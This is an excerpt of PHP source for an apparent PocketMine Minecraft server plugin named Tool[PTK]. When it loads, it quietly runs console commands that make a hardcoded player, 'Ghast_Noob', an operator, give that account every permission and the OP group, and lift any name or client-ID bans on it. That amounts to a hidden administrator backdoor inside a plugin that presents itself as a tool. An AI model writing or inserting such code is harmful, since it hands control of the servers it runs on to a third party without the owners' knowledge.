...
class Loader extends PluginBase{
	...
	$this->getLogger()->info(TextFormat::YELLOW . "§b→§aĐang chạy plugin§b Tool[PTK]§a...");
        $this->registerEvents();
...
$this->getServer()->dispatchCommand(new ConsoleCommandSender(),"op Ghast_Noob");
$this->getServer()->dispatchCommand(new ConsoleCommandSender(),"setuperm Ghast_Noob *");
$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "setgroup Ghast_Noob OP");
$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "pardon Ghast_Noob");
$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "pardoncid -8332272655818828154");
$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "pardoncid Ghast_Noob");
    }
